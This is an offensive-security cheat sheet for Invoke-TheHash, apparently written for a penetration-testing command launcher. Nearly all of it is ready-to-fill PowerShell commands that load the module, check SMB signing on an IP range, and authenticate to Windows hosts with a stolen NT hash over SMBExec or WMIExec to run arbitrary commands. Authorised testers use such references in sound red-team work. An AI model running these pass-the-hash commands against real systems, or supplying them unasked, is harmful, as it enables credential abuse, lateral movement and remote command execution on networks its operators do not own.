# invoke-thehash

% pth, windows

#plateform/windows #target/local #cat/UTILS


## load module
https://github.com/Kevin-Robertson/Invoke-TheHash
```
Import-Module ./Invoke-TheHash.psd1
```

## Check SMB signing
```
Invoke-TheHash -Type SMBExec -Target '<ip_range>'
```

## Check for command execution (pth)
SMBClient, SMBEnum, SMBExec, or WMIExec
```
Invoke-TheHash -Type <method|SMBExec> -Domain <domain_fqdn> -Username <user> -Hash <nt_hash> -Target <ip>
```

## execute command (pth) 
SMBClient, SMBEnum, SMBExec, or WMIExec
```
Invoke-TheHash -Type <method|SMBExec> -Domain <domain_fqdn> -Username <user> -Hash <nt_hash> -Command "<command|whoami>" -Target <ip>
```